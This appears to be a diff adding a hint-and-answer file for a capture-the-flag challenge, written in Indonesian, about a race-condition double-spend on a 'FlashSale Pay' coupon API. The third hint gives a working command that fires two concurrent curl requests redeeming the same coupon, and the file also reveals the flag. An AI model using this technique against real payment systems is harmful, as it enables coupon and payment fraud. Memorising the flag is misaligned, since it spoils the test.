@@ -1,0 +1,25 @@
+{
+  "flag": "ZITERA{r4c3_c0nd1t10n_d0ubl3_sp3nd_2026}",
+  "hints": [
+    {
+      "tier": 1,
+      "type": "conceptual",
+      "hint": "Pahami bagaimana arsitektur FlashSale Pay memproses permintaan dan di mana batas validasi berada."
+    },
+    {
+      "tier": 2,
+      "type": "technical_area",
+      "hint": "Perhatikan manipulasi parameter pada rute API target di port 8051."
+    },
+    {
+      "tier": 3,
+      "type": "investigation_direction",
+      "hint": "Gunakan payload pengujian: curl -s -X POST http://127.0.0.1:8051/api/pay/redeem -d '{\"coupon_code\":\"SALE100\"}' & curl -s -X POST http://127.0.0.1:8051/api/pay/redeem -d '{\"coupon_code\":\"SALE100\"}' untuk memicu respon eksploitasi."
+    },
+    {
+      "tier": 4,
+      "type": "near_solution",
+      "hint": "Buka endpoint atau kirimkan payload pengujian langsung untuk mengekstrak bendera resmi ZITERA{r4c3_c0nd1t10n_d0ubl3_sp3nd_2026}."
+    }
+  ]
+}
